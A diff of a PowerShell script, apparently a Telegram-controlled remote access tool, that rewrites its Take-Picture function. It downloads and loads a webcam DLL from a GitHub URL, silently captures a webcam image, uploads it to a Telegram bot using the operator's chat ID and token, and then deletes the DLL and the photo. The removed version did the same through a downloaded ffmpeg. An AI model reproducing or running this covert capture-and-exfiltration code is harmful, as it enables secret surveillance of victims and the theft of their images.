@@ -857,39 +857,24 @@ Function Message([string]$Message){
 }
 
 Function Take-Picture {
-$outputFolder = "$env:TEMP\8zTl45PSA"
-$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
-$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
-if (-not (Test-Path -Path $outputFolder)) {
-    New-Item -ItemType Directory -Path $outputFolder | Out-Null
+$dllPath = Join-Path -Path $env:TEMP -ChildPath "webcam.dll"
+if (-not (Test-Path $dllPath)) {
+    $url = "https://github.com/beigeworm/assets/raw/main/webcam.dll"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($url, $dllPath)
 }
-if (-not (Test-Path -Path $tempFolder)) {
-    New-Item -ItemType Directory -Path $tempFolder | Out-Null
-}
-$Path = "$env:Temp\ffmpeg.exe"
-If (!(Test-Path $Path)){  
-    GetFfmpeg
-}
-sleep 1
-$videoDevice = $null
-$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
-if (-not $videoDevice) {
-    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
-}
-if (-not $videoDevice) {
-    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
-}
-if ($videoDevice) {
-    $videoInput = $videoDevice.Name
-    $ffmpegPath = "$env:Temp\ffmpeg.exe"
-    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
-    Write-Host "Image captured and saved to $outputFile."
-} else {
-    Write-Host "No video devices found on the system."
-}
-    curl.exe -F chat_id="$ChatID" -F document=@"$outputFile" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+Add-Type -Path $dllPath
+[Webcam.webcam]::init()
+[Webcam.webcam]::select(1)
+$imageBytes = [Webcam.webcam]::GetImage()
+$tempDir = [System.IO.Path]::GetTempPath()
+$imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
+[System.IO.File]::WriteAllBytes($imagePath, $imageBytes)
     sleep 1
-    Remove-Item -Path $outputFile -Force
+    curl.exe -F chat_id="$ChatID" -F document=@"$imagePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
+    sleep 1
+    Remove-Item -Path "$env:TEMP\webcam.dll"
+    Remove-Item -Path $imagePath -Force
 }
 
 # ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------
